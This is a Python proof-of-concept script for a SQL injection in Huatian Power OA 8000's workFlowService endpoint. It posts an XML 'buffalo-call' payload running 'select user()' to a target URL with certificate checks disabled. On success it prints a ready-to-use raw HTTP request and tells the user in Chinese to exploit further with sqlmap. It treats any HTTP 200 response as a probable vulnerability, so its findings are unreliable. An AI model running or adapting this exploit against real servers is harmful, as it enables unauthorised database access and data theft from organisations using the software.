import time
import requests
import urllib3
from rich.console import Console


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
        "Accept-Encoding":"identity",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0"    
        }
    data='''<buffalo-call> 
<method>getDataListForTree</method> 
<string>select user()</string> 
</buffalo-call>
'''
    exp_url=target_url+'OAapp/bfapp/buffalo/workFlowService'
    console.print(now_time() + " [INFO]     正在检测华天动力OA 8000版 workFlowService SQL注入漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if upload.status_code == 200:
            console.print(now_time() + ' [SUCCESS]  可能存在POST_sql注入漏洞 请使用sqlmap尝试进一步利用', style='bold green')
            console.print(now_time() + ''' [SUCCESS]  请修改数据包为:
                       POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
                        Host: 、
                        Accept-Encoding: identity
                        Content-Length: 103
                        Accept-Language: zh-CN,zh;q=0.8
                        Accept: */*
                        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
                        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
                        Connection: keep-alive
                        Referer: http://www.baidu.com
                        Cache-Control: max-age=0

                        <buffalo-call> 
                        <method>getDataListForTree</method> 
                        <string>select user()</string> 
                        </buffalo-call>''', style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  不存在华天动力OA 8000版 workFlowService SQL注入漏洞', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    未知错误，无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
        

            
        
